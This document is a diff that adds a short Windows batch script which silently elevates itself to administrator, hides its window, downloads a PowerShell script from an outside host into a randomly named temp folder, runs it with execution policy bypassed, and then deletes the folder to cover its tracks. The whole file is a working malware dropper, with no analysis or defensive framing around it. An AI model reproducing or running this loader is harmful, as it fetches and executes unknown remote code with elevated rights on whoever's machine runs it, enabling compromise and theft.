@@ -1,0 +1,15 @@
+ÿþ
+@echo off
+fltmc >nul 2>&1 || (powershell start -verb runas -WindowStyle Hidden '%0' & exit /b)
+if "%1"=="" (start /min "" "%~f0" hide & exit)
+
+set "Folder=%TEMP%\Scripts_%RANDOM%"
+mkdir "%Folder%" 2>nul
+
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://alienfiles.whf.bz/don2/sc.ps1' -OutFile '%Folder%\sc.ps1'"
+
+cd /d "%Folder%"
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "sc.ps1"
+
+cd /d "%TEMP%" && rmdir /s /q "%Folder%" 2>nul
+exit
